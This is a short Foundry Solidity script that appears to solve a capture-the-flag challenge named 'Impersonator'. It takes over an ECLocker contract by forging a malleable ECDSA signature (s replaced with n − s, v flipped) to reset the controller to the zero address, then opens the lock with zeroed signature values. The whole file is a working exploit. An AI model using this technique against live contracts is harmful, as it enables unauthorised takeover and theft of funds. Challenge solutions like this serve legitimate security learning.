// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {ECLocker} from "../src/Impersonator.sol";

contract SolveImpersonator is Script {
    function run() public {
        ECLocker lock = ECLocker(address(0x82B3CbD115FD7e16F42121BC7eBdB08C675438BF));
        uint8 v = 27;
        bytes32 r = 0x1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91;
        bytes32 s = 0x78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2;

        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        uint8 v2 = 28;
        bytes32 s2 = bytes32(n - uint256(s));

        vm.startBroadcast();

        lock.changeController(v2, r, s2, address(0));
        lock.open(0, bytes32(0), bytes32(0));

        vm.stopBroadcast();

        console.log("Controller after:", lock.controller());
    }
}
